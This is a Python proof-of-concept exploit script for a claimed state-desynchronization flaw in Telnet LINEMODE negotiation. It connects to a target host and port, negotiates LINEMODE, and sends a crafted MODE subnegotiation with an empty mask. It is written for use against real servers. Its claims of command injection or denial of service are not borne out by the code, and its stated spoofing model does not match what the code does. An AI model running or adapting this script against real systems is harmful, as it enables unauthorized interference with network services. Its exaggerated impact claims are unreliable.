#!/usr/bin/env python3
"""
Proof-of-Concept: Linemode Mode Mask State Desynchronization

This script demonstrates a state confusion vulnerability in Telnet LINEMODE negotiation.
By injecting a spoofed MODE subnegotiation command, the attacker can desynchronize
the client and server state machines, leading to potential command injection or DoS.

Usage:
    python3 poc_linemode_mode_mask_state_desynchronization.py <target_ip> <target_port>

Note: This script assumes the attacker is on-path or can spoof packets to the client.
      For demonstration, it simulates the injection by connecting to the server and
      manually crafting the LINEMODE subnegotiation messages.
"""

import socket
import struct
import sys
import time

# Telnet Command Constants
IAC = 0xFF
WILL = 0xFB
WONT = 0xFC
DO = 0xFD
DONT = 0xFE
SB = 0xFA
SE = 0xF0

# LINEMODE Option Constants
LINEMODE = 34

# LINEMODE Subnegotiation Commands
LM_MODE = 1
LM_SEND = 2
LM_START = 3
LM_STOP = 4
LM_EOF = 5

# LINEMODE Mode Flags
LM_MODE_EDIT = 0x01
LM_MODE_TRAPSIG = 0x02
LM_MODE_ACK = 0x80

def craft_linemode_mode_command(mask):
    """
    Crafts a LINEMODE MODE subnegotiation command.
    
    Args:
        mask (int): The mode mask to set.
    
    Returns:
        bytes: The crafted Telnet subnegotiation message.
    """
    # IAC SB LINEMODE MODE <mask> SE
    return bytes([IAC, SB, LINEMODE, LM_MODE, mask, IAC, SE])

def send_iac(sock, command, option):
    """
    Sends a Telnet command (WILL/WONT/DO/DONT) to the socket.
    
    Args:
        sock (socket): The connected socket.
        command (int): The Telnet command (WILL, WONT, DO, DONT).
        option (int): The option code.
    """
    sock.sendall(bytes([IAC, command, option]))

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    try:
        # Step 1: Connect to the Telnet server
        print(f"[*] Connecting to Telnet server at {target_ip}:{target_port}...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, target_port))
        print("[+] Connected successfully.")

        # Step 2: Negotiate LINEMODE option
        print("[*] Negotiating LINEMODE option...")
        send_iac(sock, WILL, LINEMODE)  # Client WILL use LINEMODE
        
        # Wait for server response (DO/DONT LINEMODE)
        response = sock.recv(1024)
        print(f"[+] Server response: {response.hex()}")
        
        # Check if server accepts LINEMODE
        if bytes([IAC, DO, LINEMODE]) in response:
            print("[+] Server accepted LINEMODE negotiation.")
        else:
            print("[-] Server did not accept LINEMODE. Exiting.")
            sock.close()
            sys.exit(1)

        # Step 3: Inject spoofed LINEMODE MODE command
        # Clear EDIT and TRAPSIG bits to force character-at-a-time mode
        malicious_mask = 0x00  # No flags set
        spoofed_command = craft_linemode_mode_command(malicious_mask)
        print(f"[*] Injecting spoofed LINEMODE MODE command with mask 0x{malicious_mask:02x}...")
        sock.sendall(spoofed_command)
        
        # Step 4: Observe server response
        print("[*] Waiting for server response...")
        time.sleep(1)
        server_response = sock.recv(1024)
        print(f"[+] Server response: {server_response.hex()}")
        
        # Step 5: Analyze state desynchronization
        if bytes([IAC, SB, LINEMODE, LM_MODE, LM_MODE_ACK]) in server_response:
            print("[!] Server acknowledged the MODE command. State desynchronization may have occurred.")
            print("[!] Client and server may now interpret data differently.")
        else:
            print("[-] Server did not acknowledge the MODE command. Vulnerability may not be present.")

        # Step 6: Send test data to observe behavior
        print("[*] Sending test data to observe behavior...")
        test_data = b"test\r\n"
        sock.sendall(test_data)
        time.sleep(1)
        final_response = sock.recv(1024)
        print(f"[+] Final response: {final_response}")

    except socket.timeout:
        print("[-] Connection timed out.")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        sock.close()
        print("[*] Connection closed.")

if __name__ == "__main__":
    main()
